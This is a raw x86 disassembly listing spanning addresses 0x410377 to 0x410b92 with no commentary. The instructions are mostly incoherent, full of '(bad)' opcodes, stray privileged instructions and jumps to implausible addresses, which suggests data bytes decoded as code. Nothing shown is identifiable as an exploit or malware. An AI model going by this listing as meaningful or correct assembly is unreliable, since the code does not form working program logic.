  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
